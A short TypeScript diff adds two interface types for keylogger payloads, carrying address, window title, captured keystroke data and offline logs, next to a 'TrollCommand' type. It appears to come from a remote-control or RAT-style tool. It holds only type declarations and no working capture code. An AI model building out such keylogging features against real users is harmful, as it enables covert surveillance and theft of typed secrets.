@@ -244,3 +244,14 @@ export type TrollCommand = {
   type: TrollCommandType;
   payload?: any;
 };
+
+export interface KeyloggerUpdatePayload {
+  addr: string;
+  window: string;
+  data: string;
+}
+
+export interface KeyloggerOfflineLogsPayload {
+  addr: string;
+  logs: string[];
+}
